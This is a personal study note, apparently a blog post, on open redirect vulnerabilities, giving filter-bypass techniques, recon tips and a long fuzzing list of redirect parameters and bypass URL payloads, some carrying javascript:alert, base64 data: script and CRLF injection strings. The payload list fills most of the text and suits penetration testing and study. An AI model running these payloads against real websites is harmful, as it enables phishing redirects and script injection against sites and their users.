---
title: 学习 Open redirect
date: January 1st 2019
tags: [Web安全, 开放重定向, Bypass, 笔记]
summary: 开放重定向（Open Redirect）漏洞学习笔记，整理 @符号、?、锚点、xip.io 等多种 URL 过滤绕过技巧。
---

# 学习 Open redirect

# Open redirect

## Simple note:

If you meet a url like `http://127.0.0.1/index.php?url=http://www.baidu.com`, when it is turned on, you will be redirected to another URL.  
When the we can contral the url, there is a Open redirect vulnerability.(Of course , the vulnerability base on the url redirect is harmful to the website.)

## Bypass:

Most of the url of redirect will be filter.So the most important thing is to bypass the filter. 

- @ 
 `http://127.0.0.1@baidu.com => https://www.baidu.com/`
- ?
 `https://baidu.com => https://anysite/?baidu.com `
  When the filter will check the tail of the url, then we can use this to bypass.
- Anchor point(锚点)
 `http://127.0.0.1/#baidu.com`
  Behind the # will be seen as the anchor of the web page.

- xip.io
  xip.io provides wildcard(通配符) DNS for any IP address.
1  
2  
3  
4  
10.0.0.1.xip.io   resolves to   10.0.0.1  
www.10.0.0.1.xip.io   resolves to   10.0.0.1  
mysite.10.0.0.1.xip.io   resolves to   10.0.0.1  
foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1  

 `http://www.baidu.com.127.0.0.1.xip.io/ => 127.0.0.1`
- `\`
 `http://www.baidu.com/index.php?url=http:/\baidu.com`
  Chrome characteristic (All will redirect to baidu.com):
1  
2  
3  
4  
http:/\/baidu.com  
http:\//baidu.com  
/\/baidu.com  
http:\\\//baidu.com  

  It can bypass some filters.
- Change IP
  Change your url to a IP , maybe can bypass the filter.
  Try to use IPv6, IPv4 in decimal(十进制), hex, octal(八进制)
- Extension checked?
  If extension checked, try ?image_url={payload}/.jpg
- Strange way:
 [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403)

## Tips:

Hot find ?

- Burp Proxy history & Burp Sitemap (look at URLs with parameters)
  You can search 30X response code in burpsuite.
 **Responses to look for when fuzzing**
1  
2  
3  
4  
5  
300	Multiple choices  
301	Parmanent movement  
302	Found (Moved Temporarily)  
307	Temporary redirect  
308	Parmanent redirect
- Google dorking. : 
 `inurl:redirectURL=http://site:target.com`

- Functionalities usually associated with redirects:
1  
2  
3  
Login, Logout, Register & Password reset pages  
Change site language  
Links in emails
- Read JavaScript code
- Bruteforcing
1  
2  
3  
4  
5  
Look for hidden redirect parameters  
/redirect?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}  
/?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}  
I combined a payload with the parameter payloads below.  
/index.php?success=http://www.baidu.com&next=http://www.baidu.com&data=http://www.baidu.com&url=http://www.baidu.com&qurl=http://www.baidu.com&login=http://www.baidu.com&logout=http://www.baidu.com&ext=http://www.baidu.com&clickurl=http://www.baidu.com&goto=http://www.baidu.com&redirect_url=http://www.baidu.com&redirect=http://www.baidu.com&rit_url=http://www.baidu.com&forward_url=http://www.baidu.com&forward=http://www.baidu.com&pic=http://www.baidu.com&callback_url=http://www.baidu.com&jump=http://www.baidu.com&jump_url=http://www.baidu.com&click?u=http://www.baidu.com&originUrl=http://www.baidu.com&origin=http://www.baidu.com&Url=http://www.baidu.com&desturl=http://www.baidu.com&dest=http://www.baidu.com&u=http://www.baidu.com&page=http://www.baidu.com&u1=http://www.baidu.com&action=http://www.baidu.com&action_url=http://www.baidu.com&Redirect=http://www.baidu.com&sp_url=http://www.baidu.com&service=http://www.baidu.com&recurl=http://www.baidu.com&j?url=http://www.baidu.com&url=//http://www.baidu.com&uri=http://www.baidu.com&u=http://www.baidu.com&allinurl:http://www.baidu.com&q=http://www.baidu.com&link=http://www.baidu.com&src=http://www.baidu.com&tc?src=http://www.baidu.com&linkAddress=http://www.baidu.com&location=http://www.baidu.com&go=http://www.baidu.com&burl=http://www.baidu.com&request=http://www.baidu.com&backurl=http://www.baidu.com&RedirectUrl=http://www.baidu.com&Redirect=http://www.baidu.com&ReturnUrl=http://www.baidu.com

FUZZ:

Parameter Payload: 

```plain

success=http://www.baidu.com
next=http://www.baidu.com
data=http://www.baidu.com
url=http://www.baidu.com
qurl=http://www.baidu.com
login=http://www.baidu.com
logout=http://www.baidu.com
ext=http://www.baidu.com
clickurl=http://www.baidu.com
goto=http://www.baidu.com
redirect_url=http://www.baidu.com
redirect=http://www.baidu.com
rit_url=http://www.baidu.com
forward_url=http://www.baidu.com
@http://www.baidu.com
forward=http://www.baidu.com
pic=http://www.baidu.com
callback_url=http://www.baidu.com
jump=http://www.baidu.com
jump_url=http://www.baidu.com
click?u=http://www.baidu.com
originUrl=http://www.baidu.com
origin=http://www.baidu.com
Url=http://www.baidu.com
desturl=http://www.baidu.com
dest=http://www.baidu.com
u=http://www.baidu.com
page=http://www.baidu.com
u1=http://www.baidu.com
action=http://www.baidu.com
action_url=http://www.baidu.com
Redirect=http://www.baidu.com
sp_url=http://www.baidu.com
service=http://www.baidu.com
recurl=http://www.baidu.com
j?url=http://www.baidu.com
url=//http://www.baidu.com
uri=http://www.baidu.com
u=http://www.baidu.com
allinurl:http://www.baidu.com
q=http://www.baidu.com
link=http://www.baidu.com
src=http://www.baidu.com
tc?src=http://www.baidu.com
linkAddress=http://www.baidu.com
location=http://www.baidu.com
go=http://www.baidu.com
burl=http://www.baidu.com
request=http://www.baidu.com
backurl=http://www.baidu.com
RedirectUrl=http://www.baidu.com
Redirect=http://www.baidu.com
ReturnUrl=http://www.baidu.com
```

Url Payload:

```plain
<>//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///\;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/〱Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
\/\/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
〱Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ
%01https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
%01https://google.com
////%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/google.com
///%09/google.com
//%09/google.com
/%09/google.com
/%09/javascript:alert(1);
/%09/javascript:alert(1)
////%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/whitelisted.com@google.com
///%09/whitelisted.com@google.com
//%09/whitelisted.com@google.com
/%09/whitelisted.com@google.com
&%0d%0a1Location:https://google.com
\152\141\166\141\163\143\162\151\160\164\072alert(1)
%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529
////216.58.214.206
///216.58.214.206
//216.58.214.206
/\216.58.214.206
/216.58.214.206
216.58.214.206
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
%2f216.58.214.206//
%2f216.58.214.206
%2f216.58.214.206%2f%2f
////Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//%2f%2fⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%2f%2fⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
%2f$2f216.58.214.206
$2f%2f216.58.214.206%2f%2f
%2f$2f3627734734
$2f%2f3627734734%2f%2f
//%2f%2fgoogle.com
/%2f%2fgoogle.com
$2f%2fgoogle.com
%2f$2fgoogle.com
$2f%2fgoogle.com%2f%2f
%2f3627734734//
%2f3627734734
%2f3627734734%2f%2f
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/
%2fgoogle.com//
%2fgoogle.com
%2fgoogle.com%2f%2f
////3627734734
///3627734734
//3627734734
/\3627734734
/3627734734
3627734734
//3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//3H6k7lIAiqjfNeN@whitelisted.com@google.com/
//3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
////%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cgoogle.com
///%5cgoogle.com
//%5cgoogle.com
/%5cgoogle.com
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
////%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cwhitelisted.com@google.com
///%5cwhitelisted.com@google.com
//%5cwhitelisted.com@google.com
/%5cwhitelisted.com@google.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
";alert(0);//
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
data:whitelisted.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw
//google%00.com
/\google%252ecom
google%252ecom
<>//google.com
/<>//google.com
//;@google.com
///;@google.com
/////google.com/
/////google.com
////\;@google.com
////google.com//
////google.com/
////google.com
///\;@google.com
///google.com//
///google.com/
///google.com
//\/google.com/
//\google.com
//google.com//
//google.com/
//google.com
/.google.com
/\/\/google.com/
/\/google.com/
/\/google.com
/\google.com
/〱google.com
/google.com
../google.com
.google.com
@google.com
\/\/google.com/
〱google.com
google.com
google.com%23@whitelisted.com
////google.com/%2e%2e
///google.com/%2e%2e
//google.com/%2e%2e
/google.com/%2e%2e
//google.com/%2E%2E
////google.com/%2e%2e%2f
///google.com/%2e%2e%2f
//google.com/%2e%2e%2f
////google.com/%2f..
///google.com/%2f..
//google.com/%2f..
//google.com/%2F..
/google.com/%2F..
////google.com/%2f%2e%2e
///google.com/%2f%2e%2e
//google.com/%2f%2e%2e
/google.com/%2f%2e%2e
//google.com//%2F%2E%2E
//google.com:80?@whitelisted.com/
//google.com:80#@whitelisted.com/
google.com/.jpg
//google.com\twhitelisted.com/
//google.com/whitelisted.com
//google.com\@whitelisted.com
google.com/whitelisted.com
//google%E3%80%82com
/http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://00330.00072.0000326.00000316
http:00330.00072.0000326.00000316
http://00330.0x3a.54990
http:00330.0x3a.54990
http://00330.3856078
http:00330.3856078
http://0330.072.0326.0316
http:0330.072.0326.0316
http:%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:%0a%0dgoogle.com
http://0xd8.072.54990
http:0xd8.072.54990
http://0xd8.0x3a.0xd6.0xce
http:0xd8.0x3a.0xd6.0xce
http://0xd8.3856078
http:0xd8.3856078
http://0xd83ad6ce
http:0xd83ad6ce
http://[::216.58.214.206]
http:[::216.58.214.206]
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.whitelisted.com/
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.whitelisted.com/
http://3627734734
http:3627734734
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.whitelisted.com/
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http://3H6k7lIAiqjfNeN@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://3H6k7lIAiqjfNeN@whitelisted.com@google.com/
http://3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
http://472.314.470.462
http:472.314.470.462
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.whitelisted.com/
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
http://[::ffff:216.58.214.206]
http:[::ffff:216.58.214.206]
/http://google.com
/http:/google.com
http://;@google.com
http://.google.com
http://google.com
http:/\/\google.com
http:/google.com
http:google.com
http://google.com%23.whitelisted.com/
http://google.com%2f%2f.whitelisted.com/
http://google.com%3F.whitelisted.com/
http://google.com%5c%5c.whitelisted.com/
http://google.com:80?@whitelisted.com/
http://google.com:80#@whitelisted.com/
http://google.com\twhitelisted.com/
//https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https:Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%09/google.com
https://%09/google.com
https://%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/whitelisted.com@google.com
https://%0a%0dⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%0a%0dgoogle.com
//https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https%3a%2f%2fgoogle.com%2f
/https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https:/%5cⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/https://%5cgoogle.com
/https:/%5cgoogle.com/
https://%5cgoogle.com
https:/%5cgoogle.com/
/https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%5cwhitelisted.com@google.com
https://%5cwhitelisted.com@google.com
https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
//https://google.com//
/https://google.com//
/https://google.com/
/https://google.com
/https:google.com
https://////google.com
https://google.com//
https://google.com/
https://google.com
https:/\google.com
https:google.com
//https:///google.com/%2e%2e
/https://google.com/%2e%2e
https:///google.com/%2e%2e
//https://google.com/%2e%2e%2f
https://google.com/%2e%2e%2f
/https://google.com/%2f..
https://google.com/%2f..
/https:///google.com/%2f%2e%2e
/https://google.com/%2f%2e%2e
https:///google.com/%2f%2e%2e
https://google.com/%2f%2e%2e
https://:@google.com\@whitelisted.com
https://google.com?whitelisted.com
https://google.com/whitelisted.com
https://google.com\whitelisted.com
https://google.com#whitelisted.com
https://google%E3%80%82com
//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
https://whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
/https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//https://whitelisted.com@google.com//
/https://whitelisted.com@google.com/
https://whitelisted.com;@google.com
https://whitelisted.com.google.com
https://whitelisted.com@google.com//
https://whitelisted.com@google.com/
https://whitelisted.com@google.com
/https://whitelisted.com@google.com/%2e%2e
https:///whitelisted.com@google.com/%2e%2e
//https://whitelisted.com@google.com/%2e%2e%2f
https://whitelisted.com@google.com/%2e%2e%2f
/https://whitelisted.com@google.com/%2f..
https://whitelisted.com@google.com/%2f..
/https:///whitelisted.com@google.com/%2f%2e%2e
/https://whitelisted.com@google.com/%2f%2e%2e
https:///whitelisted.com@google.com/%2f%2e%2e
https://whitelisted.com@google.com/%2f%2e%2e
/https://whitelisted.com@google.com/%2f.//whitelisted.com@google.com/%2f..
https://whitelisted.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://whitelisted.com/https://google.com/
@https://www.google.com
http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
http://whitelisted.com@00330.00072.0000326.00000316
http:whitelisted.com@00330.00072.0000326.00000316
http://whitelisted.com@00330.0x3a.54990
http:whitelisted.com@00330.0x3a.54990
http://whitelisted.com@00330.3856078
http:whitelisted.com@00330.3856078
http://whitelisted.com@0330.072.0326.0316
http:whitelisted.com@0330.072.0326.0316
http://whitelisted.com@0xd8.072.54990
http:whitelisted.com@0xd8.072.54990
http://whitelisted.com@0xd8.0x3a.0xd6.0xce
http:whitelisted.com@0xd8.0x3a.0xd6.0xce
http://whitelisted.com@0xd8.3856078
http:whitelisted.com@0xd8.3856078
http://whitelisted.com@0xd83ad6ce
http:whitelisted.com@0xd83ad6ce
http://whitelisted.com@[::216.58.214.206]
http:whitelisted.com@[::216.58.214.206]
http://whitelisted.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://whitelisted.com%2egoogle.com/
http://whitelisted.com@3627734734
http:whitelisted.com@3627734734
http://whitelisted.com@472.314.470.462
http:whitelisted.com@472.314.470.462
http://whitelisted.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://whitelisted.com:80%40google.com/
http://whitelisted.com@[::ffff:216.58.214.206]
http:whitelisted.com@[::ffff:216.58.214.206]
http://whitelisted.com@google.com/
http://whitelisted.com+&@google.com#+@whitelisted.com/
http://whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
http://www.google.com\.whitelisted.com
http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.whitelisted.com
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
